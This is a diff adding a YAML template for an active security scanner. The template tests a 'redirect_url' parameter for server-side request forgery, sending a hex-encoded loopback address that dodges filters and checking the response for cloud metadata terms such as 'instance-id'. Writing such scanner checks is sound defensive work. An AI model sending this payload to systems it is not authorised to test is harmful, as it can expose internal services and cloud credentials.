@@ -1,0 +1,22 @@
+id: patt-ssrf-hex-01-redirect_url
+name: 'PATT ssrf patt-ssrf-hex-01 via redirect_url'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - encodehex
+description: 'PATT dotted hex 127.0.0.1. [patt:patt-ssrf-hex-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      redirect_url:
+        - 'http://0x7f.0.0.1/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
